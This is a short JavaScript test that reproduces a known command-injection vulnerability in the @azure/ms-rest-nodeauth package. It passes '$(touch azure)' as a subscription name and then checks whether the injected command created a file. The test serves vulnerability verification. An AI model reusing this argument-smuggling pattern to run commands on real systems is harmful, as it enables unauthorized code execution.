//https://snyk.io/vuln/SNYK-JS-AZUREMSRESTNODEAUTH-1245464
test("Command Injection in @azure/ms-rest-nodeauth", () => 
{
    const auth = require('@azure/ms-rest-nodeauth');
    const fs = require('fs')
	const path = './azure'
	const sleep = require('sleep');
  
    auth.AzureCliCredentials.setDefaultSubscription('$(touch azure)');

    sleep.sleep(5);
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);
});
//has some errors along with correct output